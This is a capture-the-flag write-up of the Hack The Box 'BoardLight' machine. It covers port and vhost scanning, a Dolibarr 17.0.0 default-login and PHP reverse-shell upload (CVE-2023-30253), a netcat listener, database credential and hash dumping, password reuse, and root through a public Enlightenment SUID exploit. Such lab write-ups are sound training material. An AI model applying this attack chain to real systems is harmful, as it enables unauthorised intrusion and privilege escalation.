---
{"dg-publish":true,"permalink":"/personal-site/completed-writeups/htb/board-light/","tags":["#linux","#dolibarr","enlightenment","SUIDBinary","binary_exploitation","cve"]}
---


# 10.10.11.11
---
## Enumeration &  Recon
```bash
sudo rustscan -a 10.10.11.11 -- -sS -sV -sC -oN 10.10.11.11.$(basename $PWD).nmap.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.11.11:22
Open 10.10.11.11:80
```

seems to be a php app
![Pasted image 20240525153852.png](/img/user/img/Pasted%20image%2020240525153852.png)
vhost enumeration shows crm.board.htb
```bash
ffuf -w Documents/gh-tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.11.11 -H "HOST: FUZZ.board.htb" -fs 15949

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.11
 :: Wordlist         : FUZZ: /home/brumbo/Documents/gh-tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 15949
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 88ms]
```
Dolibarr 17.0.0
![Pasted image 20240525155722.png](/img/user/img/Pasted%20image%2020240525155722.png)
a quick search for default creds gives `admin:admin` and seems to get me in but it's quite barren and I have some kind of permissions error
either way I still have access to most of the dashboard including the website creator
seems there is a cve for 17.0.0
[CVE-2023-30253](https://www.swascan.com/security-advisory-dolibarr-17-0-0/)
now to wait until everyone stops breaking the box
## Exploitation
upload a php reverse shell as a website page with `<?PHP ?>` in all caps and it will let us in
```bash
nc -lvvp 4451
Listening on any address 4451 (ctisystemmsg)
Connection from 10.10.11.11:57436
Linux boardlight 5.15.0-107-generic #117~20.04.1-Ubuntu SMP Tue Apr 30 10:35:57 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 14:00:59 up 29 min,  1 user,  load average: 4.07, 2.66, 1.71
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```
## Post Exploitation

**lateral to non-web user**

```bash
# from dolibarr conf in .../htdocts/conf
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
```

```bash
mysql -u dolibarrowner -p
serverfun2$2023!!

use dolibarr;
select * from llx_user;
```

hashes:
```
dolibarr:$2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm # superadmin

admin:$2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 # admin
```

turns out the db passwd is larissa's passwd
`larissa:serverfun2$2023!!`

### root privesc

- larissa can't run sudo
- nothing interesting running locally (other than the database) I can port forward 
- can only see my own procs running
- nothing interesting in home dir
- `find / -perm -400 2> /dev/null` we see some normal stuff that can't really be abused but did find some enlightenment binaries? running them says not to run them - interesting.
A quick google search gets us [this](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit) exploit.

Just run the script and we get a root shell

The exploit is pretty interesting and worth a read though.

and remember:

> [!quote] Maher Azzouzi
> The binary tried it's best to mitigate any non-intended behavior but as usual anything can be pwned. 
